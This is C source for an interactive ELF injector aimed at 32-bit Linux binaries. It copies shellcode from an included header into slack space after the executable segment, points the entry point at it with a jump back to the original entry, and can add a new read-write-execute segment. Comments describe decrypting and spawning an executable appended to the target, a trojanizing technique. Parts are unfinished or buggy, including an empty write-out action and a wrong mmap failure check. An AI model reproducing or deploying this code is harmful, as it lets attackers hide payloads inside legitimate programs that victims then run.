#include <elf.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <string.h>
#include <stdbool.h>
#include <stdlib.h>

#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>

#include "shellcode_32.h"

#define NUM_CMD_ACTIONS         (4)

#define MAX_NUM_CMD_ARGS        (10)
#define MAX_CMD_ARG_SIZE        (32)

#define ELF_SIGNATURE   {0x7F, 0x45, 0x4C, 0x46}

#define ARRAY_LEN(x) (sizeof(x)/sizeof(x[0]))

static volatile int g_run_forever = 1;

typedef int (* cb_action)(int argc, char **argv);

typedef struct cmd_action_s
{
    cb_action action;       /* The action to execute */
    const char *cmd_name;   /* The command name */
    const char *cmd_help;   /* The help printed on command failure */
} cmd_action_t;

typedef union
{
    Elf64_Ehdr elf64_hdr;
    Elf32_Ehdr elf32_hdr;
} elf_hdr_t;

typedef struct sinject_ctxt_s
{
    int target_fd;
    void *target_mem;
    size_t target_size;
    int payload_fd;
    void *payload_mem;
    size_t payload_size;
} sinject_ctxt_t;

static int cb_action_help(int argc, char **argv);
static int cb_action_quit(int argc, char **argv);
static int cb_action_select_target_elf(int argc, char **argv);
static int cb_action_select_payload(int argc, char **argv);
static int cb_action_add_segment(int argc, char **argv);
static int cb_action_write_patch_target(int argc, char **argv);

static sinject_ctxt_t g_sinject_context;

static cmd_action_t g_cmd_actions[] =
{
    {
        .action     = cb_action_help,
        .cmd_name   = "help",
        .cmd_help   = "Prints the help menu",
    },
    {
        .action     = cb_action_help,
        .cmd_name   = "?",
        .cmd_help   = "Prints the help menu",
    },
    {
        .action     = cb_action_quit,
        .cmd_name   = "q",
        .cmd_help   = "Quit",
    },
    {
        .action     = cb_action_select_target_elf,
        .cmd_name   = "select_target",
        .cmd_help   = "Select the ELF target that you want to modify <elf_path>",
    },
    {
        .action     = cb_action_select_payload,
        .cmd_name   = "select_payload",
        .cmd_help   = "Select the payload that you want to inject <payload_path>",
    },
    {
        .action     = cb_action_add_segment,
        .cmd_name   = "add_segment",
        .cmd_help   = "Add a new segment"
                      "of the elf, and modify the NOTE segement to be LOAD "
                      "with XRW permissions"
    },
    {
        .action     = cb_action_write_patch_target,
        .cmd_name   = "update_target",
        .cmd_help   = "Write the patched target to a new file <elf_path> "
                      "and close the selected target"
    },
};

const unsigned char elf_signature[] = ELF_SIGNATURE;

static void do_print_welcome(void)
{
    printf("Press CTRL-C or q to stop, for help press ? or type help\n");
}

static void do_context_destroy(void)
{
    if (g_sinject_context.target_mem) {
        munmap(g_sinject_context.target_mem, g_sinject_context.target_size);
    }

    if (g_sinject_context.payload_mem) {
        munmap(g_sinject_context.payload_mem, g_sinject_context.payload_size);
    }

    if (g_sinject_context.target_fd) {
        close(g_sinject_context.target_fd);
    }

    if (g_sinject_context.payload_fd) {
        close(g_sinject_context.payload_fd);
    }
}

static void do_terminate_handler(int not_used)
{
    (void)(not_used);
    g_run_forever = 0;
}

static const char *get_ptype_name(int ptype)
{
    if (ptype == PT_NULL)
        return "PT_NULL";
    else if (ptype == PT_LOAD)
        return "PT_LOAD";
    else if (ptype == PT_DYNAMIC)
        return "PT_DYNAMIC";
    else if (ptype == PT_INTERP)
        return "PT_INTERP";
    else if (ptype == PT_NOTE)
        return "PT_NOTE";
    else if (ptype == PT_SHLIB)
        return "PT_SHLIB";
    else if (ptype == PT_PHDR)
        return "PT_PHDR";
    else if (ptype == PT_GNU_STACK)
        return "PT_GNU_STACK";
    else
        return "UNKNOWN";
}

static int cb_action_help(int argc, char **argv)
{
    int i;

    printf("help menu:\n");
    for (i = 0; i < ARRAY_LEN(g_cmd_actions); i++) {
        printf("\t%s : %s\n", g_cmd_actions[i].cmd_name,
               g_cmd_actions[i].cmd_help);
    }

    return 0;
}

static int cb_action_quit(int argc, char **argv)
{
    g_run_forever = 0;
    return 0;
}

static int open_and_map_file(const char *file_name, int *fd, size_t *file_size,
                             void **mapped_mem)
{
    struct stat sb;

    *fd = open(file_name, O_RDWR, 0);
    if (*fd < 0) {
        printf("error open %s\n", file_name);
        return -1;
    }

    /* Get the file size and map the entire file in memory*/

    fstat(*fd, &sb);
    *file_size = sb.st_size;
    *mapped_mem = mmap(NULL, *file_size,
                       PROT_READ | PROT_WRITE,
                       MAP_FILE | MAP_SHARED,
                       *fd, 0);
    if (g_sinject_context.target_mem == MAP_FAILED) {
        printf("map error fd %d size %lu\n", g_sinject_context.target_fd,
               g_sinject_context.target_size);
        g_sinject_context.target_mem = NULL;
        return -1;
    }

    return 0;
}

static int extend_mapped_file(int fd, size_t *old_size, size_t increment,
                              void **mapped_mem)
{
    int ret;
    size_t new_size = *old_size + increment;

    munmap(*mapped_mem, *old_size);

    ret = ftruncate(fd, new_size);
    *mapped_mem = mmap(NULL, new_size, PROT_READ | PROT_WRITE,
                       MAP_FILE | MAP_SHARED, fd, 0);
    *old_size = new_size;
    return ret;
}

static int cb_action_select_target_elf(int argc, char **argv)
{
    int ret, i;
    ssize_t max_payload_size = 0;
    elf_hdr_t *target_elf_hdr;
    Elf32_Phdr *re_phdr = NULL;
    void *payload_start;
    off_t payload_start_offset, original_e_entry;

    ret = open_and_map_file(argv[1], &g_sinject_context.target_fd,
                            &g_sinject_context.target_size,
                            &g_sinject_context.target_mem);
    if (ret < 0) {
        printf("ERROR %d something went wrong open_target\n", ret);
        return ret;
    }

    target_elf_hdr = g_sinject_context.target_mem;
    if (memcmp(target_elf_hdr->elf64_hdr.e_ident, elf_signature,
        sizeof(elf_signature)) != 0) {
        printf("ERROR target not an ELF file\n");
        return -1;
    }

    /* Iterate the segments and verify how much space do we have left in the
     * PT_LOAD segment with (R & E) permission. If we are lucky because of
     * the page boundary aligment, we can inject our payload
     */

    if (target_elf_hdr->elf64_hdr.e_machine == EM_386) {
        for (i = 0; i < target_elf_hdr->elf32_hdr.e_phnum; i++) {
            Elf32_Phdr *iter_phdr = (Elf32_Phdr *)
                (g_sinject_context.target_mem + target_elf_hdr->elf32_hdr.e_phoff) + i;

            if (iter_phdr->p_type == PT_LOAD &&
                (iter_phdr->p_flags & PF_X) &&
                (iter_phdr->p_flags & PF_R)) {

                /* Found the PT_LOAD Read + execute segment */

                re_phdr              = iter_phdr;
                payload_start_offset = re_phdr->p_offset + re_phdr->p_memsz;

                /* Found how much space do we have between the PT_LOAD
                 * segment and the next segment.
                 */

                if (i + 1 < target_elf_hdr->elf32_hdr.e_phnum) {
                    max_payload_size = (re_phdr + 1)->p_offset -
                        payload_start_offset;
                }
            }
        }

        if (max_payload_size <= 0) {
            printf("ERROR %ld payload size invalid\n", max_payload_size);
            return -1;
        }

        if (re_phdr == NULL) {
            printf("ERROR no PT_LOAD read+execute segment in target\n");
            return -1;
        }

        printf("Max payload size is: %ld\n", max_payload_size);
        payload_start = g_sinject_context.target_mem + payload_start_offset;

        /* Good, we have the max payload size - we need to copy the patcher
         * in this area. The patcher is reponsible for decrypting the attached
         * executable(at the end of the target elf), assigning execute
         * permissions and spawning a child process which runs it.
         */

        if (shellcode_32_len > max_payload_size) {
            printf("Too bad, no space to inject %u bytes of payload\n",
                   shellcode_32_len);
            return -1;
        }

        /* Update the entry point address after copying the patcher but keep
         * the original entry point in a variable
         */

        original_e_entry                  = target_elf_hdr->elf32_hdr.e_entry;
        target_elf_hdr->elf32_hdr.e_entry = payload_start_offset;

        printf("Original entry: 0x%lx new entry: 0x%lx\n", original_e_entry,
               payload_start_offset);

        /* Update the last instruction of the patcher to redirect the
         * execution to the original entry point.
         */

        *((int *)&shellcode_32[40]) = original_e_entry - (40 + payload_start_offset);
        printf("displacement: %d bytes\n", *(int *)&shellcode_32[40]);
        memcpy(payload_start, shellcode_32, shellcode_32_len);
    }

    return 0;    
}

static int cb_action_select_payload(int argc, char **argv)
{
    return open_and_map_file(argv[1], &g_sinject_context.payload_fd,
                             &g_sinject_context.payload_size,
                             &g_sinject_context.payload_mem);
}

static int cb_action_add_segment(int argc, char **argv)
{
    elf_hdr_t *target_elf_hdr;
    int segment_indx;
    Elf32_Phdr *new_phdr32;

    if (!g_sinject_context.target_mem) {
        printf("Missing target - Use 'select_target' <elf_target_path>\n");
        return -1;
    }

    target_elf_hdr = g_sinject_context.target_mem;
    if (memcmp(target_elf_hdr->elf64_hdr.e_ident, elf_signature, sizeof(elf_signature)) != 0) {
        printf("Target not an ELF file\n");
        return -1;
    }

    if (target_elf_hdr->elf64_hdr.e_machine == EM_386) {

        size_t old_size = g_sinject_context.target_size;

        /* Extend the file size with a new Program header + one new segment
         * + 0x1000 bytes which will be used for the payload and map again */

        extend_mapped_file(g_sinject_context.target_fd,
                           &g_sinject_context.target_size,
                           0x2000 + sizeof(Elf32_Phdr) * (target_elf_hdr->elf32_hdr.e_phnum + 1),
                           &g_sinject_context.target_mem);

        target_elf_hdr = g_sinject_context.target_mem;
  
        /* Copy the program headers to the end of the executable */

        void *destination = g_sinject_context.target_mem + old_size;
        void *src = target_elf_hdr->elf32_hdr.e_phoff + g_sinject_context.target_mem;

        memcpy(destination, src, sizeof(Elf32_Phdr) * target_elf_hdr->elf32_hdr.e_phnum);

        /* Compute the address of the next load segment that we want to insert */
#if 1
        size_t new_segment_offset = 0;
        size_t aligned_address = 0;

        for (int i = 0; i < target_elf_hdr->elf32_hdr.e_phnum; i++) {
            Elf32_Phdr *iter_phdr = ((Elf32_Phdr *)destination) + i;

            if (iter_phdr->p_type == PT_LOAD) {
                 aligned_address = iter_phdr->p_vaddr + iter_phdr->p_memsz;
                 aligned_address = aligned_address + (iter_phdr->p_align - aligned_address % iter_phdr->p_align);

                 if (aligned_address > new_segment_offset) {
                    new_segment_offset = aligned_address;
                 }
            }
        }
#endif
        printf("Virtual addr of the new segment is :%lx\n", new_segment_offset);
        new_phdr32 = (Elf32_Phdr *)(destination + sizeof(Elf32_Phdr) * target_elf_hdr->elf32_hdr.e_phnum);
        new_phdr32->p_type   = PT_LOAD;
        new_phdr32->p_filesz = 0x1000;
        new_phdr32->p_offset = new_segment_offset;
        new_phdr32->p_memsz  = 0x1000;
        new_phdr32->p_vaddr  = new_segment_offset;
        new_phdr32->p_paddr  = new_segment_offset;
        new_phdr32->p_align  = 0x1000;
        new_phdr32->p_flags  = PF_X | PF_R | PF_W;

#if 1
        /* Update the first segment program header */

        Elf32_Phdr *phdr_segment = (Elf32_Phdr *)destination;
        phdr_segment->p_offset = old_size;
        phdr_segment->p_memsz  = sizeof(Elf32_Phdr) * (target_elf_hdr->elf32_hdr.e_phnum + 1);
        phdr_segment->p_filesz = phdr_segment->p_memsz;
        phdr_segment->p_vaddr  = old_size;//new_phdr32->p_vaddr;
        phdr_segment->p_paddr  = old_size;//new_phdr32->p_paddr;
#endif
        /* Update the ELF header with the new program header table and the new
         * program header segment number*/

        target_elf_hdr->elf32_hdr.e_phnum++;
        target_elf_hdr->elf32_hdr.e_phoff = old_size;
#if 0
        size_t increment = new_segment_offset + 0x1000 - g_sinject_context.target_size;
        extend_mapped_file(g_sinject_context.target_fd,
                           &g_sinject_context.target_size,
                           increment,
                           &g_sinject_context.target_mem);
#endif
    } else if (target_elf_hdr->elf64_hdr.e_machine == EM_X86_64) {
        Elf64_Phdr *phdr = (Elf64_Phdr *)(target_elf_hdr->elf64_hdr.e_phoff +
            (uint8_t *)g_sinject_context.target_mem);
        for (segment_indx = 0;
             segment_indx < target_elf_hdr->elf64_hdr.e_phnum;
             segment_indx++) {
            printf("Segment type %s (file_off 0x%lx filesz 0x%lx)"
                   "(p_vaddr 0x%lx p_memsz 0x%lx)\n",
                   get_ptype_name(phdr->p_type),
                   phdr->p_offset,
                   phdr->p_filesz,
                   phdr->p_vaddr,
                   phdr->p_paddr);
            phdr++;
        }
    }

    return 0;
}

static int cb_action_write_patch_target(int argc, char **argv)
{
    return 0;
}

static void parse_cmd_buffer(char *cmd_arg_buffer, int num_cmd_args)
{
    int i, j;
    bool is_cmd_found = false;
    char *argv[MAX_NUM_CMD_ARGS];

    memset(argv, 0, sizeof(char *) * MAX_NUM_CMD_ARGS);

    for (i = 0; i < ARRAY_LEN(g_cmd_actions); i++) {
        if (strcmp(cmd_arg_buffer, g_cmd_actions[i].cmd_name) == 0) {

            /* Copy the pointer to the args in the argv buffer */

            for (j = 0; j < num_cmd_args; j++) {
                argv[j] = &cmd_arg_buffer[j * MAX_CMD_ARG_SIZE];
            }

            is_cmd_found = true;
            g_cmd_actions[i].action(num_cmd_args, (char **)&argv);
            break;
        }
    }

    if (is_cmd_found == false) {
        printf("Unknown command: %s\n", cmd_arg_buffer);
    }
}

int main(int argc, char **argv)
{
    int ch;
    int num_cmd_args;
    int byte_arg_indx;
    char cmd_arg_buffer[MAX_NUM_CMD_ARGS][MAX_CMD_ARG_SIZE];

    /* Register a signal handler to catch CTRL-C */

    signal(SIGINT, do_terminate_handler);

    do_print_welcome();

    while (g_run_forever) {
        printf("\n>> ");

        num_cmd_args  = 0;
        byte_arg_indx = 0;

        /* Get a line in the input buffer */

        do {
            ch = getchar();

            if (ch == ' ') {
                cmd_arg_buffer[num_cmd_args][byte_arg_indx++] = '\0';
                num_cmd_args  = (num_cmd_args + 1) % MAX_NUM_CMD_ARGS;
                byte_arg_indx = 0;
            } else {
                cmd_arg_buffer[num_cmd_args][byte_arg_indx++] = (char)ch;
                byte_arg_indx = byte_arg_indx % MAX_CMD_ARG_SIZE;
            }
        } while (ch != '\n' && g_run_forever);

        /* If there are no supplied arguments just continue executing */

        if (num_cmd_args == 0 && byte_arg_indx <= 1)
            continue;

        cmd_arg_buffer[num_cmd_args][byte_arg_indx - 1] = '\0';
        num_cmd_args  = (num_cmd_args + 1) % MAX_NUM_CMD_ARGS;

        /* Parse the command arg buffer */

        parse_cmd_buffer((char *)&cmd_arg_buffer, num_cmd_args);
    }

    do_context_destroy();
    return 0;
}
